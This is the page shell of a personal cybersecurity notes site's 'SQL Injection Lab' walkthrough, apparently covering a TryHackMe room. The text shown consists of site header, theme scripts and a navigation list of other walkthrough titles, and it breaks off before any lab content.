
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="A collection of notes and writeups from my journey through cyber security concepts.">
      
      
        <meta name="author" content="Nouman Noor">
      
      
        <link rel="canonical" href="https://nanoor.github.io/CyberSec/walkthroughs/thm/sqlinjectionlab/">
      
      
        <link rel="prev" href="../sqlinjection/">
      
      
        <link rel="next" href="../ssrf/">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.46">
    
    
      
        <title>SQL Injection Lab - CyberSec</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.6f8fc17f.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#resources" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="CyberSec" class="md-header__button md-logo" aria-label="CyberSec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            CyberSec
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              SQL Injection Lab
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1M8 13h8v-2H8zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4a5 5 0 0 0 5-5 5 5 0 0 0-5-5"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../.." class="md-tabs__link">
        
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
    
      
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../notes/misc/shellstabilisation/" class="md-tabs__link">
          
  
    
  
  Notes

        </a>
      </li>
    
  

    
  

      
        
  
  
    
  
  
    
    
      
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../activedirectorybasics/" class="md-tabs__link">
          
  
    
  
  Walkthroughs

        </a>
      </li>
    
  

    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="CyberSec" class="md-nav__button md-logo" aria-label="CyberSec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>

    </a>
    CyberSec
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Notes
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Misc
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            Misc
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/misc/shellstabilisation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shell Stabilisation
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Network
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Network
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/network/dns/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DNS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/network/osimodel/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSI Model
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Privilege Escalation (Linux)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Privilege Escalation (Linux)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/privesc_linux/crontab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cron Jobs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/privesc_linux/passwdshadow/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Passwd/Shadow File
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/privesc_linux/pathvariable/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Path Variable
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/privesc_linux/suid/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SUID
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
      
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Walkthroughs
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Walkthroughs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
        
          
          
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
            
  
  <span class="md-ellipsis">
    THM
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            THM
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../activedirectorybasics/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory Basics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
        
          
          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Advent of Cyber 2022
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_2">
            <span class="md-nav__icon md-icon"></span>
            Advent of Cyber 2022
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 1 - Frameworks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 2 - Log Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 3 - OSINT
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 4 - Scanning
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day5/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 5 - Brute Force
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day6/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 6 - Email Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day7/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 7 - Cyber Chef
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day8/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 8 - Smart Contracts
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day9/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 9 - Pivoting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 10 - Hack a Game
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 11 - Memory Forensics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day12/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 12 - Malware Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day13/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 13 - Packet Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day14/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 14 - Web Applications
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day15/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 15 - Secure Coding (Securing File Upload)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day16/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 16 - Secure Coding (SQLi)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day17/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 17 - Secure Coding (Regular Expressions)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day18/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 18 - Sigma
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day19/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 19 - Hardware Hacking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day20/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 20 - Firmware Reverse Engineering
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day21/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 21 - MQTT
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../authenticationbypass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Authentication Bypass
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../basicpentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Basic Pentesting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../blue/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Blue
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commandinjection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Command Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commonlinuxprivesc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Common Linux Privesc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../crosssitescripting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross-site Scripting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../fileinclusion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File Inclusion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hydra/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hydra
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../idor/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    IDOR
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../johntheripper/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    John the Ripper
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kenobi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kenobi
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linuxprivesc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux PrivEsc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../metasploitexploitation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit - Exploitation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../metasploitmeterpreter/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit - Meterpreter
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../motherssecret/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mother's Secret
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../owaspjuiceshop/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OWASP Juice Shop
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../owasptop10_2021/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OWASP Top 10 - 2021
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../picklerick/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pickle Rick
